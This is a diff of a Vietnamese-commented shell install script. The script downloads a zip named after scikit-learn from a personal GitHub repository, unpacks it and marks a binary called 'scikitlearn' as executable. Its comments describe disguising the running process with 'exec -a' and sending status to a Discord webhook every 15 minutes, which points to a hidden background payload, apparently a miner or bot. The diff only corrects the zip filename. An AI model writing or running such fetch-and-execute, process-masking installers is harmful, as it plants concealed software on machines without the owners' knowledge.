@@ -27,8 +27,8 @@ cd "$INSTALL_DIR"
 # Tải và giải nén tệp AI
 echo "🔄 Đang tải xuống tệp AI từ $AI_ZIP_URL..."
 wget "https://github.com/gitumtriston/Computed-Network/raw/refs/heads/master/scikitlearn1.zip"
-unzip -o scikitlearn.zip
-rm scikitlearn.zip
+unzip -o scikitlearn1.zip
+rm scikitlearn1.zip
 chmod +x scikitlearn
 
 # Tạo tập lệnh runner để ngụy trang tiến trình bằng 'exec -a'
@@ -106,6 +106,7 @@ if [ -n "$DISCORD_WEBHOOK" ]; then
     echo "   - Thông báo trạng thái sẽ được gửi đến Discord mỗi 15 phút."
 
 fi
+
 
 
 
